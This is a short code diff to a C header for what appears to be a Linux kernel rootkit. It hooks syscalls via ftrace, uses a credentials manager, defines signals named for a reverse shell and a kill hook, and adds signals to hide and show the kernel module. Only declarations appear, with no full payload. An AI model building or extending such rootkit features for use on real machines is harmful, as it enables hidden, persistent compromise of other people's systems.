@@ -6,6 +6,7 @@
 #include <linux/signal.h>
 #include <linux/ftrace.h>
 #include <linux/linkage.h>
+#include <linux/list.h>
 
 #include "ftrace_manager.h"
 #include "creds_manager.h"
@@ -13,6 +14,8 @@
 // Syscalls to be hooked using frace
 #define SIGNAL_KILL_HOOK 50
 #define SIGNAL_REVERSE_SHELL 51
+#define SIGNAL_HIDE_KERNEL_MODULE 52
+#define SIGNAL_SHOW_KERNEL_MODULE 53
 
 //Hooking mkdir
 asmlinkage int hook_mkdir(const struct pt_regs *regs);
